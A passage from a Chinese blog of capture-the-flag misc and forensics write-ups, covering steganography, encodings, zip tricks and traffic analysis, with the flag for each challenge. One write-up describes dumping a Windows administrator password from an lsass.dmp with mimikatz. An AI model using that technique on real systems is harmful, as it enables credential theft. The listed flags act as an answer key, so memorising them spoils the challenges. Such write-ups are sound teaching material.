src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213892564525.8a26047ec49dd56c5ab96fb2021d50818ccfd451.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MRCTF&#123;1ts_vEryyyyyy_ez!&#125;</span><br></pre></td></tr></table></figure><h3 id="HBNIS2018-低个头"><a href="#HBNIS2018-低个头" class="headerlink" title="[HBNIS2018]低个头"></a>[HBNIS2018]低个头</h3><p>这波就蛮神奇的，根据给出密文 <code>EWAZX RTY TGB IJN IO KL</code> 用手指划键盘可得出 <code>CTF</code> 三个字符。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;CTF&#125;</span><br></pre></td></tr></table></figure><h3 id="GXYCTF2019-SXMgdGhpcyBiYXNlPw"><a href="#GXYCTF2019-SXMgdGhpcyBiYXNlPw" class="headerlink" title="[GXYCTF2019]SXMgdGhpcyBiYXNlPw=="></a>[GXYCTF2019]SXMgdGhpcyBiYXNlPw==</h3><p>题目 base 解码之后得到 <code>Is this base?</code> 的信息。感觉在暗示 base64 隐写，拿出脚本跑一下得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GXY&#123;fazhazhenhaoting&#125;</span><br></pre></td></tr></table></figure><h3 id="ACTF新生赛2020-NTFS数据流"><a href="#ACTF新生赛2020-NTFS数据流" class="headerlink" title="[ACTF新生赛2020]NTFS数据流"></a>[ACTF新生赛2020]NTFS数据流</h3><p>使用 NTFSStreamEditor2 扫描，得出 flag 文件。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213892828670.d6cb6a85efede3e939fdd5b5d4b68b5b8c68cad5.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ACTF&#123;AAAds_nntfs_ffunn?&#125; </span><br></pre></td></tr></table></figure><h3 id="RoarCTF2019-黄金6年"><a href="#RoarCTF2019-黄金6年" class="headerlink" title="[RoarCTF2019]黄金6年"></a>[RoarCTF2019]黄金6年</h3><p>010 editor 打开视频文件，在文件最后可以找到一串 base64 字符。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">UmFyIRoHAQAzkrXlCgEFBgAFAQGAgADh7ek5VQIDPLAABKEAIEvsUpGAAwAIZmxhZy50eHQwAQAD</span><br><span class="line">Dx43HyOdLMGWfCE9WEsBZprAJQoBSVlWkJNS9TP5du2kyJ275JzsNo29BnSZCgMC3h+UFV9p1QEf</span><br><span class="line">JkBPPR6MrYwXmsMCMz67DN&#x2F;k5u1NYw9ga53a83&#x2F;B&#x2F;t2G9FkG&#x2F;IITuR+9gIvr&#x2F;LEdd1ZRAwUEAA&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p>将其解码后保存发现是个需要密码的压缩文档。回到文档中找提示，发现了二维码。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213892941049.963b3e68669a4c3b7f2b03e567d829faaf353c2e.png"></p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213893076228.1d26b9bd68f66d9be54d0d596ad4e8af38d70d37.png"></p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213893188142.8777be83816db551ca0ee7928abac42e23deb5f7.png"></p><p>稍带处理后扫描得出 <code>i</code> <code>play</code> <code>ctf</code> 的字样，拼接发现不对，但是实在找不到了，上网看了一波 WriteUp 发现还有个 <code>want</code>，于是成功解压，得到了 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">roarctf&#123;CTF-from-RuMen-to-RuYuan&#125;</span><br></pre></td></tr></table></figure><h3 id="间谍启示录"><a href="#间谍启示录" class="headerlink" title="间谍启示录"></a>间谍启示录</h3><p>挂载磁盘到本地，发现一个 exe，根据暗示运行一次 exe，发现是自解压，同时生成了一些文件，其中的某一些被解压后脚本删除了。于是不用自解压，直接 7-zip 打开，发现有个 flag.exe。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213893373042.c3b6e2516eb132f7392c857234f71b258dae686a.png"></p><p>解压出来运行之后即会生成 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Flag&#123;379:7b758:g7dfe7f19:9464f:4g9231&#125;</span><br></pre></td></tr></table></figure><h3 id="我吃三明治"><a href="#我吃三明治" class="headerlink" title="我吃三明治"></a>我吃三明治</h3><p>用 010 editor 打开解压的图片，发现在文件尾部有一串字符串，后面接着另一张图片。图片提取出来之后是一张朴实的三明治图片。字符串用 base32 解码之后即为 flag。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213893662469.380a7955e772bd0191f7d079599dc1b7eb01c17d.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;6f1797d4080b29b64da5897780463e30&#125;</span><br></pre></td></tr></table></figure><h3 id="SUCTF2018-single-dog"><a href="#SUCTF2018-single-dog" class="headerlink" title="[SUCTF2018]single dog"></a>[SUCTF2018]single dog</h3><p>010 editor 打开文件可以发现很多文件，foremost 分离一下得到一个压缩包。压缩包中有一个文本文档，其中是 aaencode 的代码。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213893815181.4ed8c78cfa6e72627e3d7c42a7862022b50c7499.png"></p><p>将代码复制到工具中解密可得如下内容。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">var</span> a=<span class="string">&quot;SUCTF&#123;happy double eleven&#125;&quot;</span>;</span><br><span class="line">alert(<span class="string">&quot;双十一快乐&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">a();</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SUCTF&#123;happy double eleven&#125;</span><br></pre></td></tr></table></figure><h3 id="V-amp-N2020-公开赛-拉胯的三条命令"><a href="#V-amp-N2020-公开赛-拉胯的三条命令" class="headerlink" title="[V&amp;N2020 公开赛]拉胯的三条命令"></a>[V&amp;N2020 公开赛]拉胯的三条命令</h3><p>找开放的端口，换种思路也就是找有响应且建立连接的端口。打开 Wiresahrk 分析流量包，筛选 <code>tcp.flags == 0x010 || tcp.flags == 0x02</code> 找到全部 TCP 建立连接与相应的数据包，找到二者交替出现的端口，即为开放的端口。筛选之后找出以下端口。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">21</span><br><span class="line">22</span><br><span class="line">631</span><br><span class="line">801</span><br><span class="line">3306</span><br></pre></td></tr></table></figure><p>根据提示可知 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;21226318013306&#125;</span><br></pre></td></tr></table></figure><h3 id="安洵杯-2019-吹着贝斯扫二维码"><a href="#安洵杯-2019-吹着贝斯扫二维码" class="headerlink" title="[安洵杯 2019]吹着贝斯扫二维码"></a>[安洵杯 2019]吹着贝斯扫二维码</h3><p>解压得到一堆图片和一个压缩包，将二维码拼好。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213893999854.eb67b50dc15350f763caa25580c825431cef3c2f.png"></p><p>扫描二维码得到信息 <code>BASE Family Bucket ??? 85-&gt;64-&gt;85-&gt;13-&gt;16-&gt;32</code>。将压缩包备注取出，按照如上步骤倒序操作，得到了 <code>ThisIsSecret!233</code>。将其作为压缩包密码解压即可得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Qr_Is_MeAn1nGfuL&#125;</span><br></pre></td></tr></table></figure><h3 id="从娃娃抓起"><a href="#从娃娃抓起" class="headerlink" title="从娃娃抓起"></a>从娃娃抓起</h3><p>根据提示可知，给出的密文为两种汉字编码，四位数字描绘一个汉字的大概就是标准中文电码。对应解密之后为如下内容。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213894085870.367b2037566bb78374d1e5336b27138d2d2194bb.png"></p><p>剩下的英文字符描绘汉字的编码联系到各种输入法，容易猜想到是五笔输入法，将其转换后得到 <code>也要从娃娃抓起</code>。再根据提示将上述内容拼接后转为 MD5，得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;3b4b5dccd2c008fe7e2664bd1bc19292&#125;</span><br></pre></td></tr></table></figure><h3 id="小易的U盘"><a href="#小易的U盘" class="headerlink" title="小易的U盘"></a>小易的U盘</h3><p>第 32 个副本 exe 放到 IDA 里看字符串可以直接看到 flag。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213894226960.6b64203624ef232e93c2534a99052a0b57905076.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;29a0vkrlek3eu10ue89yug9y4r0wdu10&#125;</span><br></pre></td></tr></table></figure><h3 id="ACTF新生赛2020-swp"><a href="#ACTF新生赛2020-swp" class="headerlink" title="[ACTF新生赛2020]swp"></a>[ACTF新生赛2020]swp</h3><p>Wireshark 打开流量包筛选 http 条目，分离出 secret.zip，根据 hint.html 的内容得知压缩包是伪加密。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213894318623.e14761894f0093a8f810868c13ad1ac6fe816fa9.png"></p><p>修正压缩包伪加密，解压之后用 010 editor 打开 .swp 文件，可以直接找到 flag。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213894434296.26744d28396c4eeacd5b273b2d4502136b184264.png" alt="image-20210127175642551"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">actf&#123;c5558bcf-26da-4f8b-b181-b61f3850b9e5&#125;</span><br></pre></td></tr></table></figure><h3 id="百里挑一"><a href="#百里挑一" class="headerlink" title="百里挑一"></a>百里挑一</h3><p>Wireshark 打开数据包，发现很多图片流量，使用文件&gt;导出对象将整个 HTTP 对象导出，在图片文件的备注中可以发现一半 flag。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213894551843.77d9f83a4679a149b671f921bdceb1872b60750f.png"></p><p>根据文件名再去追踪对应的 TCP 流，猜测剩下的部分也存在 Exif 中。跟踪到 TCP 流 114，可以在 Exif 中找到剩下半个 flag。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213894688529.154cccf76a03fab4c456e19c5bc0097bbe70fc01.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;ae58d0408e26e8f26a3c0589d23edeec&#125;</span><br></pre></td></tr></table></figure><h3 id="WUSTCTF2020-alison-likes-jojo"><a href="#WUSTCTF2020-alison-likes-jojo" class="headerlink" title="[WUSTCTF2020]alison_likes_jojo"></a>[WUSTCTF2020]alison_likes_jojo</h3><p>010 打开 boki.jpg，发现其尾部有压缩文档。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213894805766.03b57f6dea6ee25a8ddc3b1589ea8310e8b1b12c.png"></p><p><code>binwalk -e</code> 分离出来，使用 ARCHPR 爆破得到密码 888866。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213894941454.34b89f8ed8ecd23f89ab3bcec39c9996b5c11a3a.png"></p><p>解压后得到一个文本文档，内容是 <code>WVRKc2MySkhWbmxqV0Zac1dsYzBQUT09</code>。三重 base64 解密之后得到 <code>killerqueen</code>。</p><p>直接把它作为 flag 发现并不正确，于是猜测为 key，尝试对 jljy.jpg 进行 outguess，得到 flag。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213895062878.6099930a54e808a08e7ea5f232c7cd6cf946ad0d.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wctf2020&#123;pretty_girl_alison_likes_jojo&#125;</span><br></pre></td></tr></table></figure><h3 id="GUET-CTF2019-zips"><a href="#GUET-CTF2019-zips" class="headerlink" title="[GUET-CTF2019]zips"></a>[GUET-CTF2019]zips</h3><p>首先使用 ARCHPR 爆破 222.zip，得到密码 723456。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213895185270.1bf06c47dbe9af1d994e84e3332447d28454e287.png"></p><p>解压之后得到 111.zip，修正伪加密之后解压出 flag.zip 和 start.sh，根据脚本内的内容可知 flag.zip 的密码为出题时的时间。结合 111.zip 和 flag 的修改时间确定范围，使用 ARCHPR 爆破出密码。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">zip -e --password=`python -c <span class="string">&quot;print(__import__(&#x27;time&#x27;).time())&quot;</span>` flag.zip flag</span><br></pre></td></tr></table></figure><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213895324079.ecc5a0788351cdd647c34d37b3a13596b8140c43.png" alt="image-20210127184534823"></p><p>解压 flag.zip 就可以得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;fkjabPqnLawhvuikfhgzyffj&#125;</span><br></pre></td></tr></table></figure><h3 id="安洵杯-2019-Attack"><a href="#安洵杯-2019-Attack" class="headerlink" title="[安洵杯 2019]Attack"></a>[安洵杯 2019]Attack</h3><p>Wireshark 分析数据包，从数据流中分理出包含 flag 的压缩文档。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213895442745.1d900fe91fdbdbbd1c55125fc79ba96b1d652193.png"></p><p>根据压缩包文档备注，得知需要找到 administrator 的密码，于是从数据包中导出 lsass.dmp，使用 mimikatz 提取出密码。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213895614694.cb4b3f805db658196cb007cbd76176dd3373442d.png"></p><p>使用提取出的密码 <code>W3lc0meToD0g3</code> 解压压缩包即得到 flag 文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D0g3&#123;3466b11de8894198af3636c5bd1efce2&#125;</span><br></pre></td></tr></table></figure><h3 id="二维码-1"><a href="#二维码-1" class="headerlink" title="二维码"></a>二维码</h3><p>简单得拼一下，然后用微信扫即可得 flag。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213896385819.9662327b220303d070e87cf7ef1c55e579bd0c83.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;7bf116c8ec2545708781fd4a0dda44e5&#125;</span><br></pre></td></tr></table></figure><h3 id="WUSTCTF2020-爬"><a href="#WUSTCTF2020-爬" class="headerlink" title="[WUSTCTF2020]爬"></a>[WUSTCTF2020]爬</h3><p>010 editor 打开文件后确定为 pdf 文件，修正拓展名。使用 Acrobat DC 打开 pdf 文件，根据提示将图片移开，得到如下图片。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213896689503.7335110b7a8f63c201cc032348b12ce6631e4bbd.png"></p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x77637466323032307b746831735f31735f405f7064665f616e645f7930755f63616e5f7573655f70686f7430736830707d</span><br></pre></td></tr></table></figure><p>将上述图片中的文字提取出来，利用十六进制转 ASCII 可得 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wctf2020&#123;th1s_1s_@_pdf_and_y0u_can_use_phot0sh0p&#125;</span><br></pre></td></tr></table></figure><h3 id="WUSTCTF2020-girlfriend"><a href="#WUSTCTF2020-girlfriend" class="headerlink" title="[WUSTCTF2020]girlfriend"></a>[WUSTCTF2020]girlfriend</h3><p>解压得到一段音频，听了一段之后分辨出是 DTMF。尝试使用<a href="http://dialabc.com/sound/detect/index.html">在线解密工具</a>解密。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213897168221.943620635cbac51389d91f7b20c82c99c0253b0d.png"></p><p>得到如下内容。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">999*666*88*2*777*33*6*99*4*444*777*555*333*777*444*33*66*3*7777</span><br></pre></td></tr></table></figure><p>然后对应手机九键进行解密，可得如下内容。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">YOUAREMXGIRLFRIENES</span><br></pre></td></tr></table></figure><p>对内容进行修正并猜测，就可以得出 <code>youaremygirlfriends</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;youaremygirlfriends&#125;</span><br></pre></td></tr></table></figure><h3 id="MRCTF2020-CyberPunk"><a href="#MRCTF2020-CyberPunk" class="headerlink" title="[MRCTF2020]CyberPunk"></a>[MRCTF2020]CyberPunk</h3><p>运行程序之后提示检测时间，于是把系统时间更改到一致即可得到 flag。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213897335630.7964fe57a84e3ef15959a999c552a83d5db6976d.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MRCTF&#123;We1cOm3_70_cyber_security&#125;</span><br></pre></td></tr></table></figure><h3 id="USB"><a href="#USB" class="headerlink" title="USB"></a>USB</h3><p>binwalk 发现解压出来的文件中有几个压缩文档，<code>binwalk -e</code> 提取出来。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213897426152.b04439c8c5d8ecadccecb23cd0d05bd4469320d9.png"></p><p>得到了一个 USB 流量的流量包，使用 <code>&quot;D:\Program Files\Wireshark\tshark.exe&quot; -r key.pcapng -T fields -e usb.capdata &gt; usbdata.txt </code> 分离出 USB 的 Leftover Capture Data，使用 UsbKeyboardDataHacker 来进行分析，得到如下字符串。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aababacbbdbdccccdcdcdbbcccbcbbcbbaababaaaaaaaaaaaaaaaaaakey&#123;xinan&#125;</span><br></pre></td></tr></table></figure><p>由 RAR 文件结构可知其 HeadType 应为 <code>0x74</code>，将其修正之后解压压缩文档，得到一张图片。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213897837158.5bf7411965ba956b3a9d0a59b8b022b0f79a5148.png"></p><p>StegSolve 可解出一张二维码，扫描可得如下内容。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ci&#123;v3erf_0tygidv2_fc0&#125;</span><br></pre></td></tr></table></figure><p>以 <code>xinan</code> 为密码，使用 Vigenère Decode 对上述内容操作，再用以 2 为密钥的栅栏密码解密即可得到 flag。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213897930952.07f0c4047661bf5e65335ed8a9a5d6079975677d.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;vig3ne2e_is_c00l&#125;</span><br></pre></td></tr></table></figure><h3 id="SWPU2019-Network"><a href="#SWPU2019-Network" class="headerlink" title="[SWPU2019]Network"></a>[SWPU2019]Network</h3><p>TTL 的题目，把网上的脚本稍微改一点，可以提取出一个压缩文档。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;ttl.txt&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    lines = f.readlines()</span><br><span class="line">n_num = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> lines:</span><br><span class="line">    <span class="keyword">if</span> i != <span class="string">&#x27;\n&#x27;</span>:</span><br><span class="line">        n_num.append(<span class="built_in">int</span>(i))</span><br><span class="line"></span><br><span class="line">rlt = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(lines)):</span><br><span class="line">    tmp = <span class="built_in">bin</span>(n_num[i])[<span class="number">2</span>:]</span><br><span class="line">    tmp = <span class="string">&#x27;0&#x27;</span> * (<span class="number">8</span> - <span class="built_in">len</span>(tmp)) + tmp</span><br><span class="line">    rlt += tmp[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">rlt2 = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(rlt), <span class="number">8</span>):</span><br><span class="line">    rlt2 += <span class="built_in">chr</span>(<span class="built_in">int</span>(rlt[i:i + <span class="number">8</span>], <span class="number">2</span>))</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;fi.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(rlt2.rstrip())</span><br><span class="line"></span><br><span class="line">hexData = <span class="built_in">open</span>(<span class="string">&#x27;fi.txt&#x27;</span>).read()</span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&#x27;fi.zip&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">file.write(binascii.unhexlify(hexData))</span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure><p>修正所得压缩包的伪加密，得到一个文本文档。对其循环 base64 解码即可得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;189ff9e5b743ae95f940a6ccc6dbd9ab&#125;</span><br></pre></td></tr></table></figure><h3 id="SUCTF2018-followme"><a href="#SUCTF2018-followme" class="headerlink" title="[SUCTF2018]followme"></a>[SUCTF2018]followme</h3><p>Wireshark 分析流量包，跟到一个 POST 请求处可以看到 flag。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213898036249.70b5f969f440c4e1164e3b28d6f00e8901cb121e.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SUCTF&#123;password_is_not_weak&#125;</span><br></pre></td></tr></table></figure><h3 id="RCTF2019-draw"><a href="#RCTF2019-draw" class="headerlink" title="[RCTF2019]draw"></a>[RCTF2019]draw</h3><p>很像 PC Logo 的代码，初中的时候玩过一些。可惜的是 PC Logo 不兼容 x64 的系统了，只能找了个在线的<a href="https://www.calormen.com/jslogo/">解释器</a>。将代码粘贴进去执行可以得到一幅图，同时也是 flag。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213898126083.97a2dd9b2237695edcf8f35e6440ec50ca7281c2.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;RCTF_HeyLogo&#125;</span><br></pre></td></tr></table></figure><h3 id="XMAN2018排位赛-通行证"><a href="#XMAN2018排位赛-通行证" class="headerlink" title="[XMAN2018排位赛]通行证"></a>[XMAN2018排位赛]通行证</h3><p>先对附件给出的字符串解 base64，再以 7 为 key 做 Rail Fence Cipher Encode，再 ROT13 一次，就可以得到 flag。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213898243968.6f9e379347082dcb99ef299abc6ecd4810ef9598.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xman&#123;oyay_now_you_get_it&#125;</span><br></pre></td></tr></table></figure><h3 id="安洵杯-2019-easy-misc"><a href="#安洵杯-2019-easy-misc" class="headerlink" title="[安洵杯 2019]easy misc"></a>[安洵杯 2019]easy misc</h3><p>解压出的文件中，decode.zip 中包含有备注 <code>FLAG IN ((√2524921X85÷5+2)÷15-1794)+NNULLULL,</code>，<code>(√2524921X85÷5+2)÷15-1794)</code> 可算得结果为 7。使用 ARCHPR 爆破出压缩包密码为 <code>2019456NNULLULL,</code>。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213898339935.c9a53496652ba615b8a7175d5ee8e41b26720f88.png" alt="image-20210127230237637"></p><p>得到字母对应字符串的替换，推测需要做词频分析。看了看网上的 WriteUp，发现我的盲水印分析不出来，可能是工具有问题，先记下答案往下走，对 11.txt 做词频分析。根据 read目录下的提示，取出词频前 16 的词，可以得到如下结果。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">频数第1: (&#39; &#39;, 75435)</span><br><span class="line">频数第2: (&#39;e&#39;, 39628)</span><br><span class="line">频数第3: (&#39;t&#39;, 27993)</span><br><span class="line">频数第4: (&#39;a&#39;, 25887)</span><br><span class="line">频数第5: (&#39;o&#39;, 25809)</span><br><span class="line">频数第6: (&#39;n&#39;, 21337)</span><br><span class="line">频数第7: (&#39;r&#39;, 20990)</span><br><span class="line">频数第8: (&#39;h&#39;, 19535)</span><br><span class="line">频数第9: (&#39;i&#39;, 19422)</span><br><span class="line">频数第10: (&#39;s&#39;, 18870)</span><br><span class="line">频数第11: (&#39;d&#39;, 15932)</span><br><span class="line">频数第12: (&#39;l&#39;, 14385)</span><br><span class="line">频数第13: (&#39;u&#39;, 9562)</span><br><span class="line">频数第14: (&#39;y&#39;, 8293)</span><br><span class="line">频数第15: (&#39;g&#39;, 8127)</span><br><span class="line">频数第16: (&#39;w&#39;, 7744)</span><br></pre></td></tr></table></figure><p>看了看别人的 WriteUp，词频算出来差不多但是内容却差了蛮多的，有点迷。</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="deletion">- QW8obWdIWT9pMkF-sd5REtRQSQWjVfXiE/WSFTajBtcw= //我拼接的字符串</span></span><br><span class="line"><span class="addition">+ QW8obWdIWT9pMkFSQWtRQjVfXiE/WSFTajBtcw== //官方 WriteUp 